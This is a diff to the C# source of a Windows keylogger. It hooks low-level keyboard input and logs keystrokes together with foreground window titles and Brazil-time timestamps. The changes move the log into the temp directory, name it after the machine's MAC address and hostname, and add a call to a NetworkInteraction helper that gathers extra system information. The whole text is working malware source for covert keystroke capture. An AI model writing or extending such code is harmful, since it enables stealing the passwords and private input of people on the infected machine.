@@ -1,13 +1,14 @@
 ﻿using System;
 using System.Text;
-using System.Globalization;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Windows.Forms;
 using System.IO;
+using System.Net;
+using keylogger;
 
 namespace vrtx_keys {
-    class KeyBoardListener {
+    class KeyboardListener {
         private static int WH_KEYBOARD_LL = 13;
         private static int WM_KEYDOWN = 0x0100;
         private static int WM_SYSKEYDOWN = 0x0104;
@@ -20,20 +21,22 @@ namespace vrtx_keys {
         private static bool capsPressed = GetKeyState(VK_CAPITAL);
         private static bool shiftPressed = GetKeyState(VK_SHIFT);
         private static bool rAltPressed = GetKeyState(VK_RMENU);
-        private static string FILEPATH = fileAccess(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
-        private static IntPtr pfgw;
+        
+        private static string FILEPATH = FileAccess(Path.GetTempPath());
+        private static IntPtr PFGW;
 
         public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-        private static string fileAccess(string path){
+        private static string FileAccess(string path){
             if(!Directory.Exists(path)) {
                 Directory.CreateDirectory(path);
             }
 
-            string filepath = path + @"\data.txt";
+            string filepath = path + @"\" + NetworkInteraction.GetMacAddress() + "_" + Dns.GetHostName() + ".log";
 
             if(!File.Exists(filepath)){
                 using(StreamWriter sw = File.CreateText(filepath)) { }
+                NetworkInteraction.GetExtraInfo();
             }
 
             return filepath;
@@ -48,7 +51,7 @@ namespace vrtx_keys {
 	                IntPtr fgw = GetForegroundWindow();
                     StringBuilder title = new StringBuilder("", 256);
 
-                    if (pfgw != fgw) {
+                    if (PFGW != fgw) {
 
                         // Brazil DateTime
                         DateTime utcDateTime = DateTime.UtcNow;
@@ -62,7 +65,7 @@ namespace vrtx_keys {
                         output.Write("\n[{0}] - GMT-3: {1}\n", title.ToString(), brzDateTime.ToString());
 
                         // ForegroundWindow updated
-                        pfgw = fgw;
+                        PFGW = fgw;
                     }
                 }
         
